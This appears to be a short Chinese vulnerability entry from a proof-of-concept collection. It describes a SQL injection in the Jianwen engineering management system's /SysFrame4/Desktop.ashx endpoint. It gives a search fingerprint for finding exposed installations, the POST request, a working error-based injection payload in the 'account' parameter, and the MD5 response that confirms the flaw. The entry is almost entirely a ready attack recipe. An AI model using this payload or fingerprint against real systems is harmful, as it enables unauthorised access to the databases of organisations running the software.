# 建文工程管理系统desktop存在SQL注入漏洞

建文工程管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="Login/QRLogin.ashx"`
- **请求**：`POST /SysFrame4/Desktop.ashx HTTP/1.1`

**Payload**
```
account=1'+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','233')),3,32))<0--&method=isChangePwd&pwd=
```
- **响应特征**：200 e165421110ba03099a1c0393373c5b43